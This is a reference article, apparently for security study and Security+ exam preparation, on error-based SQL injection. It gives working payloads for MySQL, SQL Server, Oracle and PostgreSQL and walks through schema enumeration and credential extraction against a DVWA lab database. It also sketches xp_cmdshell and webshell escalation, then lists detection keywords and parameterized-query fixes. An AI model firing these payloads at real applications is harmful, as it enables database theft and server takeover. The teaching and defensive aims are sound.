```markdown
---
domain: "offensive-security"
tags: [sqli, web-security, injection, owasp, databases, attack]
---
# Error-Based SQL Injection

**Error-based SQL injection** is an *in-band* [[SQL injection]] technique in which an attacker deliberately provokes a database management system (DBMS) into returning verbose error messages that leak query results, schema metadata, or the contents of arbitrary rows. It relies on the target application echoing raw DBMS errors to the HTTP response, converting the error channel into a covert data-exfiltration primitive. It is one of three canonical SQLi families alongside [[union-based SQL injection]] and [[blind SQL injection]].

---

## Overview

Error-based SQL injection emerged as a practical offensive technique in the early 2000s, when web frameworks routinely surfaced verbose ODBC, JDBC, and native DBMS error messages directly to end users. The seminal paper *Advanced SQL Injection in SQL Server Applications* by Chris Anley (NGSSoftware, 2002) demonstrated that attackers could coerce Microsoft SQL Server into including query results inside error strings via type-conversion failures — most famously the `CONVERT(int, (SELECT @@version))` pattern, which produces an error like `Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2019...' to data type int`. This turned any page that displayed a database error into a full read primitive over the entire database server.

The technique exists because SQL is a strongly typed, declarative language whose engines produce descriptive diagnostics by design. When a cast, XML parse, or unique-key comparison fails, most DBMS implementations include the offending value in the error text — useful for developers, catastrophic when that text reaches an unauthenticated client. Error-based SQLi is particularly valuable to attackers because it is dramatically faster than [[blind SQL injection]]: a single HTTP request can return an entire row, whereas boolean-blind techniques may require thousands of requests to extract the same data bit by bit.

Error-based SQLi is cataloged under [[CWE-89]] ("Improper Neutralization of Special Elements used in an SQL Command") and remains a top contributor to the [[OWASP Top 10]] category "A03:2021 – Injection." Notable real-world incidents include the 2008 *Heartland Payment Systems* breach (130 million card records, initiated via SQL injection against a corporate web application), the 2011 *Sony Pictures* compromise by LulzSec (published as a demonstration of trivial error disclosure), and the 2015 *TalkTalk* breach (157,000 customer records exfiltrated via SQLi against a legacy customer-portal page, resulting in a £400,000 ICO fine).

Modern frameworks such as Rails, Django, Laravel, and Spring Boot default to opaque error pages in production, which has reduced — but not eliminated — error-based SQLi. It persists wherever stack traces leak through misconfigured reverse proxies, WAFs that echo upstream errors, legacy PHP applications running `display_errors=On`, custom error handlers that render exception messages verbatim, and APIs that return JSON error bodies containing the raw DBMS reason phrase. Automated tools such as [[sqlmap]] will attempt error-based extraction first because of its speed advantage before falling back to union-based or blind techniques.

---

## How It Works

Error-based injection requires three conditions: (1) a parameter whose value is concatenated into a SQL query without proper parameterization; (2) a DBMS feature that embeds attacker-controlled data inside an error message; and (3) an application that propagates that error text to the HTTP response. The attacker crafts a payload that invokes the feature with a subquery, then reads the subquery's result from the reflected error string.

### Step 1 — Fingerprint the DBMS

The attacker first identifies the backend by submitting benign syntactic probes (`'`, `"`, `\`, `;`) and comparing the resulting error strings:

| Error text fragment | DBMS |
|---|---|
| `You have an error in your SQL syntax` | MySQL / MariaDB |
| `Unclosed quotation mark after the character string` | Microsoft SQL Server |
| `ORA-00933: SQL command not properly ended` | Oracle |
| `unterminated quoted string at or near` | PostgreSQL |
| `SQLite3::Exception` | SQLite |

### Step 2 — Select an Error Vector

Each DBMS exposes different functions that embed attacker-controlled data into error output.

**MySQL / MariaDB — XPath functions (most common)**
```sql
-- EXTRACTVALUE: the non-XPath character 0x7e (~) forces an error containing the subquery result
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))-- -

-- UPDATEXML: identical principle via a different XPath function
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1)-- -
```
Both return an error such as:
```
XPATH syntax error: '~5.7.44-log~'
```

**MySQL — Duplicate-key technique (useful when XPath functions are filtered)**
```sql
' AND (SELECT 1 FROM (
    SELECT COUNT(*), CONCAT(
        (SELECT database()),
        FLOOR(RAND(0)*2)
    ) x FROM information_schema.tables GROUP BY x
) a)-- -
```
Returns:
```
Duplicate entry 'dvwa1' for key 'group_key'
```

**Microsoft SQL Server — Implicit type conversion**
```sql
-- Casting a string subquery to INT fails and includes the string value in the error
'; SELECT CONVERT(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))-- -
' AND 1=CONVERT(int, (SELECT @@version))-- -
```
Returns:
```
Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2019...' to data type int.
```

**Oracle — CTX and UTL_INADDR abuse**
```sql
-- CTXSYS.DRITHSX.SN raises a DRG-* error containing its argument
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -

-- UTL_INADDR.GET_HOST_NAME attempts to resolve the value as a hostname and fails verbosely
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- -
```

**PostgreSQL — Explicit CAST**
PostgreSQL is stricter about error verbosity; the most reliable in-band vector is an incompatible type cast:
```sql
' AND 1=CAST((SELECT version()) AS int)-- -
```
Returns:
```
invalid input syntax for type integer: "PostgreSQL 14.1 on x86_64-pc-linux-gnu..."
```

### Step 3 — Enumerate Schema and Extract Data

With the working vector confirmed, the attacker substitutes subqueries of increasing specificity, walking `information_schema` (MySQL/MSSQL/PostgreSQL) or `ALL_TABLES`/`USER_TABLES` (Oracle):

```sql
-- Enumerate databases (MySQL)
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata), 0x7e))-- -

-- Enumerate tables in a target schema
' AND EXTRACTVALUE(1, CONCAT(0x7e,
    (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='dvwa'),
    0x7e))-- -

-- Extract credentials from the users table
' AND EXTRACTVALUE(1, CONCAT(0x7e,
    (SELECT CONCAT(user,':',password) FROM dvwa.users LIMIT 0,1),
    0x7e))-- -
```

Because XPath errors in MySQL truncate output at approximately 32 characters, long values are retrieved in slices using `SUBSTRING()`:
```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT password FROM dvwa.users LIMIT 0,1), 1, 31), 0x7e))-- -
' AND EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT password FROM dvwa.users LIMIT 0,1), 32, 31), 0x7e))-- -
```

### Step 4 — Privilege Escalation (Post-Extraction)

On Microsoft SQL Server with a high-privilege service account, error-based extraction is frequently a stepping stone to OS command execution via `xp_cmdshell`. On MySQL with `FILE` privilege, `LOAD_FILE()` and `INTO OUTFILE` enable arbitrary server-side file read/write, often used to drop a PHP webshell into the web root.

---

## Key Concepts

- **In-band exfiltration**: Error-based SQLi returns data over the same HTTP channel as the original request, unlike [[out-of-band SQL injection]], which relies on DNS lookups or HTTP callbacks to an attacker-controlled server.
- **Type-conversion error**: A class of DBMS error raised when a value cannot be coerced to the target data type (e.g., string → `INT`); crucially, the DBMS includes the original string value in the diagnostic message, which is what makes exfiltration possible.
- **XPath function abuse**: MySQL's `EXTRACTVALUE()` and `UPDATEXML()` parse their second argument as an XPath expression; a malformed XPath (e.g., a leading `~`) triggers a parse error that contains the full expression text — so embedding a subquery inside the XPath argument causes the subquery result to appear in the error.
- **Double-query / duplicate-key technique**: A MySQL-specific pattern that uses `GROUP BY` on a computed column built from `RAND()`, forcing a `Duplicate entry` error that contains the subquery result; useful when XPath functions are blocked by a WAF.
- **Verbose error disclosure**: The underlying enabling misconfiguration — `display_errors=On` in PHP, unhandled exceptions in Java EE, custom 500 pages that render `exception.getMessage()`, or REST APIs returning `{"error": "<driver text>"}`.
- **Fingerprinting by error prefix**: Each DBMS has distinctive error prefixes (`ORA-`, `SQLSTATE`, `Msg 245`, `pg_`); passive reconnaissance exploits these signatures to select the correct payload family before active exploitation.
- **Second-order error-based SQLi**: Injection is stored in one request (e.g., a username during registration) and triggered later when a separate query reads the tainted row — for example, an account-management page — producing the leaking error in a different context than where the payload was inserted.

---

## Exam Relevance

For **Security+ SY0-701**, error-based SQLi is tested under:
- **Objective 2.3** — Explain various types of vulnerabilities (injection)
- **Objective 2.4** — Indicators of malicious activity (web-based attacks)

**Key exam points:**

- SQL injection is classified as an **injection attack**; the primary mitigation is **parameterized queries / prepared statements**. Input validation and stored procedures are recognized as secondary or defense-in-depth controls but are not sufficient alone.
- **Verbose error messages** returned to users constitute an **information disclosure** vulnerability in their own right — expect standalone questions about the risk of displaying stack traces in production, independent of any SQLi context.
- A classic question pattern: an attacker submits a crafted value and the browser displays `Conversion failed when converting the varchar value 'admin' to data type int`. The question asks for the attack type — the answer is **SQL injection** (error-based). Do not confuse this with XSS or command injection.
- Know that **WAFs** detect and block common SQLi signatures but are **defense-in-depth**, not a replacement for secure coding practices. The exam may ask about the correct *primary* control.
- Distinguish the three major SQLi categories: **error-based** (requires error text in response), **union-based** (requires column count/type matching), and **blind** (boolean or time-based; works even when no output is returned). The exam may present scenarios and ask which technique applies.
- **Gotcha**: Stored procedures do *not* automatically prevent SQLi if they internally concatenate input into a dynamic `EXEC` or `sp_executesql` call without binding parameters.

---

## Security Implications

Error-based SQLi typically yields full read access to the database within minutes and is routinely escalated beyond data theft:

- **Credential theft**: Dumping credential tables and cracking hashes offline with Hashcat or John the Ripper.
- **Authentication bypass**: Reading session tokens, password-reset tokens, or MFA seeds stored in the database.
- **OS command execution**: MSSQL with `xp_cmdshell` enabled (or re-enabled via `sp_configure`) provides direct shell access under the SQL Server service account, which is frequently `NT AUTHORITY\SYSTEM` on legacy deployments.
- **Arbitrary file access**: MySQL with `FILE` privilege allows reading `/etc/passwd` via `LOAD_FILE()` and writing webshells via `INTO OUTFILE`, pivoting a database read to full application server compromise.
- **Lateral movement**: MSSQL linked servers (`OPENQUERY`), Oracle database links (`DBLINK`), and PostgreSQL Foreign Data Wrappers (`postgres_fdw`) can be abused post-injection to execute queries against adjacent database hosts on the internal network.

**Real CVEs and incidents:**

| Reference | Description |
|---|---|
| **CVE-2014-3704** (Drupalgeddon) | Pre-auth SQLi in Drupal 7 core via PHP array handling in the login form; exploited en masse within hours of public disclosure |
| **CVE-2017-8917** | Joomla! 3.7.0 unauthenticated SQLi in `com_fields`; error-based extraction of admin credentials confirmed by researchers |
| **CVE-2022-21661** | WordPress `WP_Query` class SQL injection enabling error-based credential extraction; affected millions of installations |
| **Heartland (2008)** | 130 million card records compromised; initiated via SQLi against a corporate web app |
| **TalkTalk (2015)** | 157,000 customer records; attacker was a 17-year-old; £400,000 fine under UK DPA |

**Detection indicators:**
- Elevated HTTP 500 response rate from a single source IP in access logs
- User-supplied values containing `EXTRACTVALUE`, `UPDATEXML`, `CONVERT(int`, `CAST(`, `information_schema`, `FLOOR(RAND`, or `CONCAT(0x` in URL parameters or POST bodies
- Sudden spike in DBMS error log entries (`mysqld` error log, MSSQL `ERRORLOG`, PostgreSQL `pg_log`)
- WAF rule hits in the 942100–942999 range (OWASP CRS)

---

## Defensive Measures

**1. Parameterized queries / prepared statements** — the definitive, non-bypassable fix at the code layer:

```python
# Python + MySQL Connector — CORRECT
cursor.execute("SELECT * FROM users WHERE id = %s", (user_input,))

# Python — INCORRECT (vulnerable)
cursor.execute("SELECT * FROM users WHERE id = " + user_input)
```

```java
// Java — CORRECT
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setInt(1, userId);

// Java — INCORRECT (vulnerable)
Statement stmt = conn.createStatement();
stmt.execute("SELECT * FROM users WHERE id = " + userId);
```

```php
// PHP PDO — CORRECT (ATTR_EMULATE_PREPARES=false forces true server-side binding)
$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->bindParam(':id', $id, PDO::PARAM_INT);
```

**2. Suppress verbose errors in production:**
- PHP: `display_errors=Off` and `log_errors=On` in `php.ini`
- ASP.NET: `<customErrors mode="On" defaultRedirect="error.html" />` in `web.config`
- Java EE: Configure a generic `<error-page>` in `web.xml`; never let `ex.getMessage()` reach the response body

**3. ORMs and query builders**: Django ORM, SQLAlchemy, Hibernate, Entity Framework, and ActiveRecord parameterize by default.